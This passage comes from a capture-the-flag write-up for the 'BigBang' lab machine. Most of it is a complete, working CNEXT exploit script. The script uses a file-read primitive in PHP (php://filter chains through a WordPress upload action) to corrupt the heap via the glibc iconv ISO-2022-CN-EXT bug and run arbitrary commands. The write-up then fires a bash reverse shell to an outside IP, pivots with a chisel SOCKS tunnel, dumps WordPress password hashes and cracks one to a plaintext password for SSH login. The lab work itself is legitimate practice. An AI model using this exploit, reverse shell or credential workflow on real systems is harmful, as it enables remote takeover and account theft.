                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -> Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)->bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) > 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = 'GIF89a' + tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
        
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "./libc.so.6"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)
        print(f'HEAP address: {hex(self.info["heap"])}')

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        #self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        print(f'LIBC address: {hex(libc.start)}')
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.remote.data_decode(self.get_file(remote_path))
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        #self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource) #b64(pages) 
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            msg_print("Sending exploit...")
            print(f'PATH: {path}')

            self.remote.send_exploit(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```

We copied the `libc.so6` into the same directory as our `exploit.py` and provided a `reverse shell` payload to it and got granted access to the box as `www-data`.

```c
┌──(venv)─(kali㉿kali)-[~/Downloads]
└─$ cp /media/sf_cybersecurity/notes/HTB/Machines/BigBang/files/libc.so.6 .
```

```c
┌──(venv)─(kali㉿kali)-[~/Downloads]
└─$ python3 exploit.py http://blog.bigbang.htb/wp-admin/admin-ajax.php "bash -c 'exec bash -i >& /dev/tcp/10.10.14.226/9001 0>&1'" -s 5
[*] Potential heaps: 0x7fb504400040, 0x7fb504200040, 0x7fb502c00040, 0x7fb500600040 (using first)
[*] '/home/kali/Downloads/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

     EXPLOIT  SUCCESS 
```

```c
┌──(kali㉿kali)-[~/Downloads/cnext-exploits]
└─$ nc -lnvp 9001 
listening on [any] 9001 ...
connect to [10.10.14.226] from (UNKNOWN) [10.129.78.109] 39490
bash: cannot set terminal process group (1): Inappropriate ioctl for device                                                                                                                                                                 
bash: no job control in this shell                                                                                                                                                                                                          
www-data@bf9a078a3627:/var/www/html/wordpress/wp-admin$
```

## Enumeration

As our first step we dropped `deepce` to see if we needed to perform a `container breakout` but it seemed that the container was secure.

- [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)

```c
www-data@bf9a078a3627:/tmp$ ./deepce.sh
./deepce.sh

                      ##         .
                ## ## ##        ==                                                                                                                                                                                                          
             ## ## ## ##       ===                                                                                                                                                                                                          
         /"""""""""""""""""\___/ ===                                                                                                                                                                                                        
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~                                                                                                                                                                                                 
         \______ X           __/
           \    \         __/                                                                                                                                                                                                               
            \____\_______/                                                                                                                                                                                                                  
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines                                                                                                                                                                                                                     

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window                                                                                                                                                                             
See https://stealthcopter.github.io/deepce                                                                                                                                                                                                  

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... www-data
[+] Groups .................. www-data
[+] Sudo .................... Password required
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Not Found
[+] Docker Version .......... Version Unknown
==================================( Enumerating Container )===================================
[+] Container ID ............ bf9a078a3627
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.3 
[+] DNS Server(s) ........... 1.1.1.1 8.8.8.8 
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 5.15.0-130-generic
[+] Arch .................... x86_64
[+] CPU ..................... AMD EPYC 7513 32-Core Processor
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget                                                                                                                                                                                                                               
/usr/bin/gcc                                                                                                                                                                                                                                
/usr/bin/hostname                                                                                                                                                                                                                           
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh: 0000000000000000
CapPrm: 0000000000000000                                                                                                                                                                                                                    
CapEff: 0000000000000000                                                                                                                                                                                                                    
CapBnd: 00000000a80425fb                                                                                                                                                                                                                    
CapAmb: 0000000000000000                                                                                                                                                                                                                    
> This can be decoded with: "capsh --decode=0000000000000000"
[+] SSHD Service ............ No
[+] Privileged Mode ......... Unknown
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... No
[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rwxr-xr-x 1 www-data www-data 39K Jan 26 16:11 /tmp/deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... No
[+] Hashes in shadow file ............... Not readable
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further                                                                                                                                                                                         

Could not ping sweep, requires nmap or ping to be executable
==============================================================================================
```

## Port Forwarding

To move on we uploaded `chisel` and forwarded our traffic through a `SOCKS Proxy`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/serve]
└─$ ./chisel server -p 9002 -reverse -v
2025/01/26 17:57:52 server: Reverse tunnelling enabled
2025/01/26 17:57:52 server: Fingerprint MzmE2lEFreva8hJSM7FR4+xDCw3yiqoSx8BqEyIwVvY=
2025/01/26 17:57:52 server: Listening on http://0.0.0.0:9002
```

```c
www-data@bf9a078a3627:/tmp$ ./chisel client 10.10.14.226:9002 R:socks
./chisel client 10.10.14.226:9002 R:socks
2025/01/26 17:01:35 client: Connecting to ws://10.10.14.226:9002
2025/01/26 17:01:35 client: Connected (Latency 20.115806ms)
```

## Pivoting

Now we had access to the `container` which ran `WordPress` and therefore to the `MySQL` database for which we found `credentials` earlier.

```c
┌──(kali㉿kali)-[~]
└─$ proxychains -q mysql -h 172.17.0.1 -u 'wp_user' --skip-ssl -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 114
Server version: 8.0.32 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

A quick walk through the `database` gave us some `hashes`.

```c
MySQL [(none)]> SHOW databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
3 rows in set (0.00 sec)
```

```c
MySQL [(none)]> USE wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]>
```

```c
MySQL [wordpress]> SHOW tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.021 sec)
```

```c
MySQL [wordpress]> SELECT * FROM wp_users \G;
*************************** 1. row ***************************
                 ID: 1
         user_login: root
          user_pass: $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
      user_nicename: root
         user_email: root@bigbang.htb
           user_url: http://blog.bigbang.htb
    user_registered: 2024-05-31 13:06:58
user_activation_key: 
        user_status: 0
       display_name: root
*************************** 2. row ***************************
                 ID: 3
         user_login: shawking
          user_pass: $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
      user_nicename: shawking
         user_email: shawking@bigbang.htb
           user_url: 
    user_registered: 2024-06-01 10:39:55
user_activation_key: 
        user_status: 0
       display_name: Stephen Hawking
2 rows in set (0.020 sec)

ERROR: No query specified
```

## Privilege Escalation to shawking

### Cracking the Hash

We put the `hash` of `shawking` into a file and provided it to `John The Ripper` which cracked the `hash` in notime.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ cat hash
$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/BigBang/files]
└─$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
quantumphysics   (?)     
1g 0:00:01:50 DONE (2025-01-26 19:04) 0.009069g/s 40399p/s 40399c/s 40399C/s quarashi33..quaniyah
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

| Password       |
| -------------- |
| quantumphysics |

With the use of `Proxychains` we logged in as `shawking` and got finally access to the `user.txt`.

```c
┌──(kali㉿kali)-[~]
└─$ proxychains ssh shawking@172.17.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:22  ...  OK
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ED25519 key fingerprint is SHA256:w7PN9DfWgTxbKl4gY79ZdTPLHPbZEfNlJN/9PTBIFBM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.1' (ED25519) to the list of known hosts.
shawking@172.17.0.1's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan 26 05:02:13 PM UTC 2025

  System load:           0.06
  Usage of /:            63.4% of 9.74GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             172
  Users logged in:       0
  IPv4 address for eth0: 10.129.77.135
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c5a9


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 20 16:26:58 2025 from 10.10.14.65
shawking@bigbang:~$
```

## user.txt

```c
shawking@bigbang:~$ cat user.txt
afbb8376ed1642f738f00e44d4746c84
```

## Pivoting (shawking)

We started `pivoting` through `shawking` and first of all found two more users.

```c
shawking@bigbang:~$ id
uid=1001(shawking) gid=1001(shawking) groups=1001(shawking)
```

```c
shawking@bigbang:~$ sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.
```

```c
shawking@bigbang:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
george:x:1000:1000:George Hubble:/home/george:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
shawking:x:1001:1001:Stephen Hawking,,,:/home/shawking:/bin/bash
developer:x:1002:1002:,,,:/home/developer:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

| Username  |
| --------- |
| george    |
| developer |

Within `/opt/data` we carved out two `hashes` for `admin` and `George Hubble`.

```c
shawking@bigbang:~$ ls -la
total 40
drwxr-x--- 6 shawking shawking 4096 Jan 17 11:37 .
drwxr-xr-x 4 root     root     4096 Jun  5  2024 ..
lrwxrwxrwx 1 root     root        9 Jan 17 11:37 .bash_history -> /dev/null
